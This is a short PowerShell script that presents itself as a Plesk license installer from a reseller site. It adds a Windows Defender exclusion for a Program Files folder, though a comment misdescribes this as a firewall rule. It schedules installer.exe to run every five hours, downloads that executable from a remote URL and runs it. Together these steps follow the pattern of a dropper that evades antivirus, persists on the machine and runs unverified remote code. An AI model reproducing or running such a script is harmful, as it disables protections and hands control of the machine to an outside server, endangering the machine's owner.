

# Create license folder

if (!(Test-Path "C:\Program Files\CSL\Plesk\bin"))
{
    New-Item -ItemType directory -Path "C:\Program Files\CSL\Plesk\bin\" | Out-Null
}

# Allow license bin folder to windows firewall

if (Get-Command 'Add-MpPreference' -errorAction SilentlyContinue)
{
    Add-MpPreference -ExclusionPath "C:\Program Files\CSL\Plesk\bin\"
}



# Add license bin folder to windows environments

$pathContent = [Environment]::GetEnvironmentVariable('path', 'Machine')
$myPath = "C:\Program Files\CSL\Plesk\bin"
if ($pathContent -ne $null)
{
  # "Exist in the system!"
  if (!($pathContent -split ';'  -contains  $myPath))
  {
      setx PATH "$env:path;C:\Program Files\CSL\Plesk\bin" -m
  }

}
schtasks /create /tn "pleskinstallerwindows" /tr "C:\Program Files\CSL\Plesk\bin\installer.exe" /sc hourly /mo 5

$activation = new-object System.Net.WebClient
$activation.DownloadFile("https://cpanelseller.com/api/files/dplesk/dpleskinstallerwindows", "C:\Program Files\CSL\Plesk\bin\installer.exe")

& "C:\Program Files\CSL\Plesk\bin\installer.exe"
